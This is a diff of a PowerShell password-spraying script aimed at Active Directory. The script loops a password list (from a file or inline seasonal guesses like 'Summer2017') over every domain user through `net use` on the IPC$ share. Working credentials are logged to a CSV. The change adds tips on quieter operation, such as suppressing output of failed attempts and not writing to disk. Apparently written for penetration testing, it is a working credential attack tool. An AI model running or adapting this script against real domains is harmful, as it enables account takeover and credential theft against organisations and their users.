@@ -5,9 +5,13 @@ Import-Module ActiveDirectory
 # Set errors to stop, this will prevent false positives in the password spray script
 $ErrorActionPreference = 'Stop'
 
-# Set filepaths for variables
-$passwords = get-content "c:\temp\passwords.txt" # This is where you'll have your password list
+# Define output
 $output = "c:\temp\output_" + (Get-Date -Format "MM-dd-yyyy") + ".csv." # This will be where working passwords are written
+
+# Define password list (comment out line that you aren't using)
+$passwords = get-content "c:\temp\passwords.txt" # Use a password list from a file
+# $passwords = 'Summer2017','Fall2017','Winter2017','Spring2017' # define a password list to run from memory
+
 
 # Set variables for domain
 $computer = $env:COMPUTERNAME # If you are testing against another domain, change this to a domain connected machine 
@@ -27,13 +31,13 @@ foreach($password in $passwords)
     foreach($user in $users)
     {
         $username = $user.SamAccountName
-        echo "Running $password against $username"
+        echo "Running $password against $username" # comment this out to only see successful passwords
 
         # Try to connect to the IPC share using the password and user specified
         try
         {
             net use \\$computer\IPC$ /user:"$domain\$username" $password
-            Add-Content $output "$username, $password"
+            Add-Content $output "$username, $password" # comment this out to not write a file to disk
             net use /delete \\$computer\IPC$
             echo "Password Found! $username\$password"
         }
